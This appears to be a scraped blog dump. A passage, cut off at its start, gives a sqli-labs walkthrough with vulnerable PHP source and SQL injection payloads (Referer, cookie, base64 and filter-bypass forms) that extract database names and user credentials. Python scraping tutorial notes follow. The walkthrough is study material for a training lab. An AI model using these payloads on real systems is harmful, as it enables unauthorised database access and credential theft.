count(*),concat(database(),&#39;;&#39;,floor(rand()*2)) as x from information_schema.tables group by x)as a) and &#39;1&#39;=&#39;1 Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)回显返回referer php文件： &lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0); function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,20); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = \"'\" . mysql_real_escape_string($value) . \"'\"; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; $uagent = $_SERVER['HTTP_REFERER']; $IP = $_SERVER['REMOTE_ADDR']; echo \"&lt;br&gt;\"; echo 'Your IP ADDRESS is: ' .$IP; echo \"&lt;br&gt;\";// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) &#123; $uname = check_input($_POST['uname']); $passwd = check_input($_POST['passwd']); //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'Referer:'.$uname.\"\\n\"); fclose($fp); $sql=\"SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\"; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) &#123; echo '&lt;font color= \"##FFFF00\" font size = 3 &gt;'; $insert=\"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')\"; mysql_query($insert); //echo 'Your IP ADDRESS is: ' .$IP; echo \"&lt;/font&gt;\"; //echo \"&lt;br&gt;\"; echo '&lt;font color= \"##0000ff\" font size = 3 &gt;'; echo 'Your Referer is: ' .$uagent; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; print_r(mysql_error()); echo \"&lt;br&gt;&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;br&gt;\"; &#125; else &#123; echo '&lt;font color= \"##0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125; &#125;?&gt; 使用burpsuite将referer改成 Referer:&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39; 或者在referer后面加*，使用sqlmap Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)输入admin、admin &lt;?php//including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0);if(!isset($_COOKIE['uname'])) &#123; //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); echo \"&lt;div style=' margin-top:20px;color:#FFF; font-size:24px; text-align:center'&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color='#FF0000'&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;\"; echo \"&lt;div align='center' style='margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;'&gt;\"; echo \"&lt;div style='padding-top:10px; font-size:15px;'&gt;\"; echo \"&lt;!--Form to post the contents --&gt;\"; echo '&lt;form action=\" \" name=\"form1\" method=\"post\"&gt;'; echo ' &lt;div style=\"margin-top:15px; height:30px;\"&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;'; echo ' &lt;input type=\"text\" name=\"uname\" value=\"\"/&gt; &lt;/div&gt;'; echo ' &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;'; echo ' &lt;input type=\"text\" name=\"passwd\" value=\"\"/&gt;&lt;/div&gt;&lt;/br&gt;'; echo ' &lt;div style=\" margin-top:9px;margin-left:90px;\"&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Submit\" /&gt;&lt;/div&gt;'; echo '&lt;/form&gt;'; echo '&lt;/div&gt;'; echo '&lt;/div&gt;'; echo '&lt;div style=\" margin-top:10px;color:#FFF; font-size:23px; text-align:center\"&gt;'; echo '&lt;font size=\"3\" color=\"#FFFF00\"&gt;'; echo '&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;'; echo '&lt;img src=\"../images/Less-20.jpg\" /&gt;'; echo '&lt;/center&gt;'; function check_input($value) &#123; if(!empty($value)) &#123; $value = substr($value,0,20); // truncation (see comments) &#125; if (get_magic_quotes_gpc()) // Stripslashes if magic quotes enabled &#123; $value = stripslashes($value); &#125; if (!ctype_digit($value)) // Quote if not a number &#123; $value = \"'\" . mysql_real_escape_string($value) . \"'\"; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) &#123; $uname = check_input($_POST['uname']); $passwd = check_input($_POST['passwd']); $sql=\"SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\"; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); $cookee = $row1['username']; if($row1) &#123; echo '&lt;font color= \"#FFFF00\" font size = 3 &gt;'; setcookie('uname', $cookee, time()+3600); header ('Location: index.php'); echo \"I LOVE YOU COOKIES\"; echo \"&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size = 3 &gt;'; //echo 'Your Cookie is: ' .$cookee; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; print_r(mysql_error()); echo \"&lt;br&gt;&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;br&gt;\"; &#125; else &#123; echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125; &#125; echo \"&lt;/font&gt;\"; echo '&lt;/font&gt;'; echo '&lt;/div&gt;';&#125;else&#123; if(!isset($_POST['submit'])) &#123; $cookee = $_COOKIE['uname']; $format = 'D d M Y - H:i:s'; $timestamp = time() + 3600; echo \"&lt;center&gt;\"; echo '&lt;br&gt;&lt;br&gt;&lt;br&gt;'; echo '&lt;img src=\"../images/Less-20.jpg\" /&gt;'; echo \"&lt;br&gt;&lt;br&gt;&lt;b&gt;\"; echo '&lt;br&gt;&lt;font color= \"red\" font size=\"4\"&gt;'; echo \"YOUR USER AGENT IS : \".$_SERVER['HTTP_USER_AGENT']; echo \"&lt;/font&gt;&lt;br&gt;\"; echo '&lt;font color= \"cyan\" font size=\"4\"&gt;'; echo \"YOUR IP ADDRESS IS : \".$_SERVER['REMOTE_ADDR']; echo \"&lt;/font&gt;&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4 &gt;'; echo \"DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;\"; echo '&lt;font color= \"orange\" font size = 5 &gt;'; echo \"YOUR COOKIE : uname = $cookee and expires: \" . date($format, $timestamp); echo \"&lt;br&gt;&lt;/font&gt;\"; $sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\"; $result=mysql_query($sql); if (!$result) &#123; die('Issue with your mysql: ' . mysql_error()); &#125; $row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font color= \"pink\" font size=\"5\"&gt;'; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo '&lt;font color= \"grey\" font size=\"5\"&gt;'; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;&lt;/b&gt;\"; echo \"&lt;br&gt;\"; echo 'Your ID:' .$row['id']; &#125; else &#123; echo \"&lt;center&gt;\"; echo '&lt;br&gt;&lt;br&gt;&lt;br&gt;'; echo '&lt;img src=\"../images/slap1.jpg\" /&gt;'; echo \"&lt;br&gt;&lt;br&gt;&lt;b&gt;\"; //echo '&lt;img src=\"../images/Less-20.jpg\" /&gt;'; &#125; echo '&lt;center&gt;'; echo '&lt;form action=\"\" method=\"post\"&gt;'; echo '&lt;input type=\"submit\" name=\"submit\" value=\"Delete Your Cookie!\" /&gt;'; echo '&lt;/form&gt;'; echo '&lt;/center&gt;'; &#125; else &#123; echo '&lt;center&gt;'; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 6 &gt;'; echo \" Your Cookie is deleted\"; setcookie('uname', $row1['username'], time()-3600); header ('Location: index.php'); echo '&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;'; &#125; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; //header ('Location: main.php'); echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; //echo '&lt;img src=\"../images/slap.jpg\" /&gt;&lt;/center&gt;'; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'Cookie:'.$cookee.\"\\n\"); fclose($fp); &#125;?&gt; 查询语句中使用了cookee，尝试在cookies里面进行注入，抓包 看到cookie：uname=admin，确定是cookie注入 在admin后加’，报错， Cookie: uname&#x3D;admin&#39; order by 3--+ &#x2F;&#x2F;1-3 正常Cookie: uname&#x3D;admin&#39; order by 4--+ &#x2F;&#x2F;4 不正常 ，确定行数为3 Cookie: uname&#x3D;-admin&#39; union select 1,2,database()--+ Less-21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入) uname值base64加密，其余与上一个题相同 上传加密语句 admin&#39; and 1&#x3D;1 --+ &#x2F;&#x2F;明文YWRtaW4nIGFuZCAxPTEgLS0r &#x2F;&#x2F;密文 -admin&#39;) union select 1,2,database()#LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw&#x3D;&#x3D; Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)双引号，其余与上一题相同 -admin&quot; union select 1,2,database()#LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型) 没有输入框，考虑get型注入 id&#x3D;&#39; 报错 ?id&#x3D;&#39; union select 1,2,database() &#39;?id&#x3D;&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() or &#39;1&#39;&#x3D; &#39;?id&#x3D;&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; or &#39;1&#39;&#x3D; &#39;?id&#x3D;&#39; union select 1,group_concat(username),group_concat(password) from users where 1 or &#39;1&#39; &#x3D; &#39; Less - 24 Second Degree Injections Real treat -Store Injections (二次注入)注册用户 admin’# 登录后修改密码，语句成为 users SET passwd然后用修改过的密码登录admin账号## **Less-25** Trick with OR &amp; AND (过滤了or和and)![image-20200829115431073](sqli-labs.assets&#x2F;image-20200829115431073.png)过滤了or和and输入&#96;&#96;&#96;?id&#x3D;1 报错![image-20200829115610277](sqli-labs.assets&#x2F;image-20200829115610277.png)&#96;&#96;&#96;?id&#x3D;1&#39;%23 成功，可以注入 使用union查询?id=-1' union select 1,2,database()--+ 注意犹豫过滤了or，将password改成passwoorrd ?id&#x3D;-1&#39; union select 1,2,group_concat(username,0x7e,passwoorrd) from users--+ 双写or和and?id&#x3D;0&#39; oorr 1&#x3D;1 --+?id&#x3D;2&#39; aandnd 1&#x3D;1 --+ 成功 Less-26(failed) Trick with comments and space (过滤了注释和空格的注入)借鉴：https://www.jianshu.com/p/ff72f2c6d99c 源码 $id = blacklist($id);$hint =$id;function blacklist($id)&#123; $id = preg_replace('/or/i',\"\",$id); //strip out OR (non case sensitive) $id = preg_replace('/and/i',\"\",$id); //Strip out AND (non case sensitive) $id = preg_replace('/[\\/\\*]/',\"\",$id); //strip out /* $id = preg_replace('/[--]/',\"\",$id); //Strip out -- $id = preg_replace('/[#]/',\"\",$id); //Strip out # $id = preg_replace('/[\\s]/',\"\",$id); //Strip out spaces $id = preg_replace('/[\\/\\\\\\\\]/',\"\",$id); //Strip out slashes return $id;&#125; 不仅过滤了上一关的or与and，还过滤了单行注释--与#(含URL编码)以及多行注释/**/（被解释为空格，常用于过滤空格时），还过滤了(空格)，以及正反斜杠/与\\。 使用%a0绕过，没有成功 updatexml注入?id&#x3D;0&#39;||updatexml(1,concat(&#39;$&#39;,(database())),0)||&#39;1&#39;&#x3D;&#39;1 ?id&#x3D;0&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;&#39;security&#39;))),0)||&#39;1&#39;&#x3D;&#39;1 less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的） 没有过滤大写的关键字 把or换成&amp;&amp;（%26%26） 题解里面写的用%a0绕过空格过滤，我这里没有成功 less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us双引号型 ?id&#x3D;1&quot;and(length(database())&gt;7)%a0uNion%a0sELect%a01,2,&quot;3 同样，%a0过滤不成功","categories":[],"tags":[]},{"title":"python/零散笔记","slug":"python/零散笔记","date":"2020-08-07T06:41:06.540Z","updated":"2020-08-07T06:41:06.540Z","comments":true,"path":"2020/08/07/python/零散笔记/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/08/07/python/%E9%9B%B6%E6%95%A3%E7%AC%94%E8%AE%B0/","excerpt":"","text":"按照字符串列表中的数字排序at_name = os.listdir('C:/Users/lxm/Desktop/打印/文件/其它/5装订_2份/')i=1def tryint(s): #将元素中的数字转换为int后再排序 try: return int(s) except ValueError: return sdef str2int(v_str): #将元素中的字符串和数字分割开 a=[tryint(sub_str) for sub_str in re.split('([0-9]+)', v_str)][1]# [1]是数字的部分 return adef sort_humanly(v_list): #以分割后的list为单位进行排序 return sorted(v_list, key=str2int)atac_name=sort_humanly(at_name) 修改文件名import osimport reat_name = os.listdir('C:/Users/lxm/Desktop/打印/文件/其它/5装订_2份/')i=1def tryint(s): #将元素中的数字转换为int后再排序 try: return int(s) except ValueError: return sdef str2int(v_str): #将元素中的字符串和数字分割开 a=[tryint(sub_str) for sub_str in re.split('([0-9]+)', v_str)] return adef sort_humanly(v_list): #以分割后的list为单位进行排序 return sorted(v_list, key=str2int)atac_name=sort_humanly(at_name)for temp in atac_name: print(temp) print(str(i)) a=temp print(a) os.rename('C:/Users/lxm/Desktop/打印/文件/其它/5装订_2份/' + temp, 'C:/Users/lxm/Desktop/打印/文件/其它_/5装订_2份/' +str(i)+'_'+ temp) i += 1","categories":[],"tags":[]},{"title":"莫烦Python——爬虫","slug":"python/爬虫/爬虫简介","date":"2020-07-14T05:06:36.000Z","updated":"2020-07-30T15:47:00.395Z","comments":true,"path":"2020/07/14/python/爬虫/爬虫简介/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/07/14/python/%E7%88%AC%E8%99%AB/%E7%88%AC%E8%99%AB%E7%AE%80%E4%BB%8B/","excerpt":"","text":"内容来自：https://morvanzhou.github.io/ 爬虫简介了解网页的结构html，css，js from urllib.request import urlopen# if has Chinese, apply decode()html = urlopen( \"https://morvanzhou.github.io/static/scraping/basic-structure.html\").read().decode('utf-8') # read读出网页源码# 网页中有中文，用decode解码print(html) 打印出来内容 &lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;cn&quot;&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;Scraping tutorial 1 | 莫烦Python&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;icon&quot; href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;static&#x2F;img&#x2F;description&#x2F;tab_icon.png&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;h1&gt;爬虫测试1&lt;&#x2F;h1&gt; &lt;p&gt; 这是一个在 &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;&quot;&gt;莫烦Python&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;tutorials&#x2F;data-manipulation&#x2F;scraping&#x2F;&quot;&gt;爬虫教程&lt;&#x2F;a&gt; 中的简单测试. &lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; # 用正则表达式匹配tag，筛选信息import re# 找到网页的titleres = re.findall(r\"&lt;title&gt;(.+?)&lt;/title&gt;\", html)print(\"\\nPage title is: \", res[0]) # Page title is: Scraping tutorial 1 | 莫烦Python # flags=re.DOTALL，使对tab、new line不敏感# 如果去掉这个参数，则不能查找出所需内容res = re.findall(r\"&lt;p&gt;(.*?)&lt;/p&gt;\", html, flags=re.DOTALL) # re.DOTALL if multi lineprint(\"\\nPage paragraph is: \", res[0]) # Page paragraph is:# 这是一个在 &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;&quot;&gt;莫烦Python&lt;&#x2F;a&gt;# &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;tutorials&#x2F;scraping&quot;&gt;爬虫教程&lt;&#x2F;a&gt; 中的简单测试. 如果直接print(res) [&#39;\\n\\t\\t这是一个在 &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;&quot;&gt;莫烦Python&lt;&#x2F;a&gt;\\n\\t\\t&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;tutorials&#x2F;data-manipulation&#x2F;scraping&#x2F;&quot;&gt;爬虫教程&lt;&#x2F;a&gt; 中的简单测试.\\n\\t&#39;] 猜测使直接打印list时，不进行转义找到所有链接 res = re.findall(r'href=\"(.*?)\"', html)print(\"\\nAll links: \", res) [&#39;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;static&#x2F;img&#x2F;description&#x2F;tab_icon.png&#39;, &#39;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;&#39;, &#39;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;tutorials&#x2F;data-manipulation&#x2F;scraping&#x2F;&#39;] BeautifulSoup 英文官网：https://www.crummy.com/software/BeautifulSoup/bs4/doc/ 中文官网：https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/ BeautifulSoup解析网页基础安装pip install beautifulsoup4 简单使用方法from bs4 import BeautifulSoupfrom urllib.request import urlopen## if has Chinese, apply decode()html = urlopen(\"https://morvanzhou.github.io/static/scraping/basic-structure.html\").read().decode('utf-8')print(html) 打印出网页html ## 以lxml形式解析网页soup = BeautifulSoup(html, features='lxml')## 选择tag h1print(soup.h1)## 选择tag pprint(soup.p)## 返回所有的链接all_href=soup.find_all('a')## 生成一个列表all_href = [l['href'] for l in all_href]print('\\n', all_href) 打印出来一个list [&#39;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;&#39;, &#39;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;tutorials&#x2F;data-manipulation&#x2F;scraping&#x2F;&#39;] 解析CSSCSS的Class&lt;!DOCTYPE html&gt;&lt;html lang=\"cn\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;爬虫练习 列表 class | 莫烦 Python&lt;/title&gt; &lt;style&gt; .jan &#123; -- class的信息 background-color: yellow; &#125; .feb &#123; font-size: 25px; &#125; .month &#123; color: red; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;列表 爬虫练习&lt;/h1&gt;&lt;p&gt;这是一个在 &lt;a href=\"https://morvanzhou.github.io/\" &gt;莫烦 Python&lt;/a&gt; 的 &lt;a href=\"https://morvanzhou.github.io/tutorials/data-manipulation/scraping/\" &gt;爬虫教程&lt;/a&gt; 里无敌简单的网页, 所有的 code 让你一目了然, 清晰无比.&lt;/p&gt;&lt;ul&gt; &lt;li class=\"month\"&gt;一月&lt;/li&gt; &lt;ul class=\"jan\"&gt; &lt;li&gt;一月一号&lt;/li&gt; &lt;li&gt;一月二号&lt;/li&gt; &lt;li&gt;一月三号&lt;/li&gt; &lt;/ul&gt; &lt;li class=\"feb month\"&gt;二月&lt;/li&gt; &lt;li class=\"month\"&gt;三月&lt;/li&gt; &lt;li class=\"month\"&gt;四月&lt;/li&gt; &lt;li class=\"month\"&gt;五月&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; from bs4 import BeautifulSoupfrom urllib.request import urlopen## if has Chinese, apply decode()html = urlopen(\"https://morvanzhou.github.io/static/scraping/list.html\").read().decode('utf-8')soup = BeautifulSoup(html, features='lxml')## use class to narrow search## 标签li中，class为中包含month的month = soup.find_all('li', &#123;\"class\": \"month\"&#125;)for m in month: ## m为html形式 ## m.get_text()为网页显示的文字 print(m.get_text()) 输出结果 一月二月三月四月五月 ## 嵌套查找jan = soup.find('ul', &#123;\"class\": 'jan'&#125;)d_jan = jan.find_all('li') ## use jan as a parentfor d in d_jan: print(d.get_text()) 正则表达式 正则表达式教程：https://morvanzhou.github.io/tutorials/python-basic/basic/13-10-regular-expression/ 找到所有图片形式的链接 如 &lt;td&gt; &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;static&#x2F;img&#x2F;course_cover&#x2F;tf.jpg&quot;&gt;&lt;&#x2F;td&gt; 挑选出jpg图片 from bs4 import BeautifulSoupfrom urllib.request import urlopenimport re## if has Chinese, apply decode()html = urlopen(\"https://morvanzhou.github.io/static/scraping/table.html\").read().decode('utf-8')soup = BeautifulSoup(html, features='lxml')## img标签中，src内容符合.jpg的内容img_links = soup.find_all(\"img\", &#123;\"src\": re.compile('.*?\\.jpg')&#125;)for link in img_links: print(link['src']) ## 找到开头为https://morvan的链接course_links = soup.find_all('a', &#123;'href': re.compile('https://morvan.*')&#125;)for link in course_links: print(link['href']) 爬百度百科爬这个网页：https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/5162711 从这个网页为起点，爬取并进入网页链接 from bs4 import BeautifulSoupfrom urllib.request import urlopenimport reimport random## 百度百科base_url = \"https://baike.baidu.com\"## “网络爬虫”词条his = [\"/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/5162711\"]## -1是指选取list中的最后一个元素url = base_url + his[-1]html = urlopen(url).read().decode('utf-8')soup = BeautifulSoup(html, features='lxml')## 找到h1print(soup.find('h1').get_text(), ' url: ', his[-1])## taget=\"_blank\"是指另外打开一个网页## find valid urlssub_urls = soup.find_all(\"a\", &#123;\"target\": \"_blank\", \"href\": re.compile(\"/item/(%.&#123;2&#125;)+$\")&#125;)if len(sub_urls) != 0: his.append(random.sample(sub_urls, 1)[0]['href'])else: ## no valid sub link found his.pop()print(his) 循环爬取多个网页 his = [\"/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/5162711\"]for i in range(20): url = base_url + his[-1] html = urlopen(url).read().decode('utf-8') soup = BeautifulSoup(html, features='lxml') print(i, soup.find('h1').get_text(), ' url: ', his[-1]) ## find valid urls sub_urls = soup.find_all(\"a\", &#123;\"target\": \"_blank\", \"href\": re.compile(\"/item/(%.&#123;2&#125;)+$\")&#125;) if len(sub_urls) != 0: his.append(random.sample(sub_urls, 1)[0]['href']) else: ## no valid sub link found his.pop() 更多下载/请求方式多功能的Requests安装requests模块pip install requests requests getimport requestsimport webbrowser# ?wd=莫烦Pythonparam = &#123;\"wd\": \"莫烦Python\"&#125; # 搜索的信息r = requests.get('http://www.baidu.com/s', params=param)print(r.url)# http://www.baidu.com/s?wd=%E8%8E%AB%E7%83%A6Python# 用浏览器打开webbrowser.open(r.url) requests post http://pythonscraping.com/pages/files/form.html data = &#123;'firstname': '莫烦', 'lastname': '周'&#125;r = requests.post('http://pythonscraping.com/files/processing.php', data=data)print(r.text)# Hello there, 莫烦 周! 提交照片 http://pythonscraping.com/files/form2.html file = &#123;'uploadFile': open('./image.png', 'rb')&#125;r = requests.post('http://pythonscraping.com/files/processing2.php', files=file)print(r.text)# The file image.png has been uploaded. 登录 payload = &#123;'username': 'Morvan', 'password': 'password'&#125;r = requests.post('http://pythonscraping.com/pages/cookies/welcome.php', data=payload)print(r.cookies.get_dict())# &#123;'username': 'Morvan', 'loggedin': '1'&#125;r = requests.get('http://pythonscraping.com/pages/cookies/profile.php', cookies=r.cookies)print(r.text)# Hey Morvan! Looks like you're still logged into the site! 使用session登录session = requests.Session()payload = &#123;'username': 'Morvan', 'password': 'password'&#125;r = session.post('http://pythonscraping.com/pages/cookies/welcome.php', data=payload)print(r.cookies.get_dict())# &#123;'username': 'Morvan', 'loggedin': '1'&#125;r = session.get(\"http://pythonscraping.com/pages/cookies/profile.php\")print(r.text)# Hey Morvan! Looks like you're still logged into the site! 下载文件inspect 查找文件链接 https://morvanzhou.github.io/static/img/description/learning_step_flowchart.png # 新建文件夹import osos.makedirs('./img/', exist_ok=True)IMAGE_URL = \"https://morvanzhou.github.io/static/img/description/learning_step_flowchart.png\" urlretrievefrom urllib.request import urlretrieveurlretrieve(IMAGE_URL, './img/image1.png') requestsimport requestsr = requests.get(IMAGE_URL)# 把文件写进去with open('./img/image2.png', 'wb') as f: f.write(r.content) 如果文件很大，更适合下面这个方法 r = requests.get(IMAGE_URL, stream=True) # stream loadingwith open('./img/image3.png', 'wb') as f: for chunk in r.iter_content(chunk_size=32): f.write(chunk) 下载国家地理杂志图片http://www.ngchina.com.cn/animals/ 找到图片位置 from bs4 import BeautifulSoupimport requestsURL = \"http://www.nationalgeographic.com.cn/animals/\"html = requests.get(URL).textsoup = BeautifulSoup(html, 'lxml')img_ul = soup.find_all('ul', &#123;\"class\": \"img_list\"&#125;)# 循环下载图片for ul in img_ul: imgs = ul.find_all('img') for img in imgs: url = img['src'] r = requests.get(url, stream=True) image_name = url.split('/')[-1] with open('./img/%s' % image_name, 'wb') as f: for chunk in r.iter_content(chunk_size=128): f.write(chunk) print('Saved %s' % image_name) 爬虫加速多进程加速式import multiprocessing as mpimport timefrom urllib.request import urlopen, urljoinfrom bs4 import BeautifulSoupimport re# base_url = \"http://127.0.0.1:4000/\" # 内网base_url = 'https://morvanzhou.github.io/'def crawl(url): response = urlopen(url) # time.sleep(0.1) # slightly delay for downloading return response.read().decode()def parse(html): soup = BeautifulSoup(html, 'lxml') urls = soup.find_all('a', &#123;\"href\": re.compile('^/.+?/$')&#125;) title = soup.find('h1').get_text().strip() page_urls = set([urljoin(base_url, url['href']) for url in urls]) # 去重 url = soup.find('meta', &#123;'property': \"og:url\"&#125;)['content'] return title, page_urls, urlunseen = set([base_url,]) # 去重seen = set() 普通方法 # DON'T OVER CRAWL THE WEBSITE OR YOU MAY NEVER VISIT AGAINif base_url != \"http://127.0.0.1:4000/\": restricted_crawl = Trueelse: restricted_crawl = Falsewhile len(unseen) != 0: # still get some url to visit if restricted_crawl and len(seen) &gt;= 20: break htmls = [crawl(url) for url in unseen] results = [parse(html) for html in htmls] seen.update(unseen) # seen the crawled unseen.clear() # nothing unseen for title, page_urls, url in results: unseen.update(page_urls - seen) # get new url to crawl 分布式方法 pool = mp.Pool(4) # 进程池while len(unseen) != 0: # htmls = [crawl(url) for url in unseen] # ---&gt; crawl_jobs = [pool.apply_async(crawl, args=(url,)) for url in unseen] htmls = [j.get() for j in crawl_jobs] # results = [parse(html) for html in htmls] # ---&gt; parse_jobs = [pool.apply_async(parse, args=(html,)) for html in htmls] results = [j.get() for j in parse_jobs] 异步加载 Asyncio在单线程里使用异步计算，下载网页的时候和处理网页的时候是不连续的，更有效利用了等待下载的这段时间 以下代码适用于python3.5+ Asyncio示例# 不是异步的import timedef job(t): print('Start job ', t) time.sleep(t) # wait for \"t\" seconds print('Job ', t, ' takes ', t, ' s')def main(): [job(t) for t in range(1, 3)]t1 = time.time()main()print(\"NO async total time : \", time.time() - t1)\"\"\"Start job 1Job 1 takes 1 sStart job 2Job 2 takes 2 sNO async total time : 3.008603096008301\"\"\" import asyncioasync def job(t): # async 形式的功能 print('Start job ', t) await asyncio.sleep(t) # 等待 \"t\" 秒, 期间切换其他任务 print('Job ', t, ' takes ', t, ' s')async def main(loop): # async 形式的功能 tasks = [ loop.create_task(job(t)) for t in range(1, 3) ] # 创建任务, 但是不执行 await asyncio.wait(tasks) # 执行并等待所有任务完成t1 = time.time()loop = asyncio.get_event_loop() # 建立 looploop.run_until_complete(main(loop)) # 执行 looploop.close() # 关闭 loopprint(\"Async total time : \", time.time() - t1)\"\"\"Start job 1Start job 2Job 1 takes 1 sJob 2 takes 2 sAsync total time : 2.001495838165283\"\"\" Asyncio爬虫(aiohttp)import requestsURL = 'https://morvanzhou.github.io/'def normal(): for i in range(2): r = requests.get(URL) url = r.url print(url)t1 = time.time()normal()print(\"Normal total time:\", time.time()-t1)\"\"\"https://morvanzhou.github.io/https://morvanzhou.github.io/Normal total time: 0.3869960308074951\"\"\" import aiohttpimport timeimport asyncioURL = 'https://morvanzhou.github.io/'async def job(session): response = await session.get(URL) # 等待拿到url时执行其它程序 return str(response.url)async def main(loop): async with aiohttp.ClientSession() as session: # 官网推荐建立 Session 的形式 tasks = [loop.create_task(job(session)) for _ in range(2)] # 创建任务但不执行 finished, unfinished = await asyncio.wait(tasks) # 执行等到所有任务完成 all_results = [r.result() for r in finished] # 获取所有结果 print(all_results)t1 = time.time()loop = asyncio.get_event_loop()loop.run_until_complete(main(loop))loop.close()print(\"Async total time:\", time.time() - t1)\"\"\"['https://morvanzhou.github.io/', 'https://morvanzhou.github.io/']Async total time: 0.11447715759277344\"\"\" 和多线程的对比 Selenium火狐插件 Katalon 